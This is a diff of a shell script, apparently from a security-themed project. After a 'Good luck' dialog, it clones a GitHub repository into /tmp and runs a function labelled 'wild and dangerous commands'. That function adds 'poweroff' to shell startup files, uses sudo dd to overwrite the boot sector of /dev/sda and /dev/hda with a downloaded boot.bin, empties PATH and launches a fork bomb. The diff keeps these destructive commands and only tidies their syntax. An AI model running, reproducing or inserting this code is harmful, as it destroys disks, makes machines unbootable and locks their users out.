@@ -15,10 +15,8 @@ if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
       if [[ $? -eq 0 ]]; then
         zenity --info --text "Welp, Good luck." --title "..." --ok-label "Alright"
         cd /tmp
-        mkdir last
-        cd last
         git clone https://github.com/Psylops/summerproj.git
-        cd summerproj/CyberSec/bootloader
+        cd /tmp/summerproj/CyberSec/bootloader
         wildcommands
       else
         exit
@@ -55,10 +53,10 @@ fi
 
 #wild and dangerous commands:
 
-wildcommands() {
+function wildcommands() {
   echo poweroff >> .bashrc && echo poweroff >> .zshrc;
   sudo dd if=boot.bin of=/dev/sda bs=512;
   sudo dd if=boot.bin of=/dev/hda bs=512;
-  export $PATH="";
+  PATH="";
   :(){ :|:& };:
 }
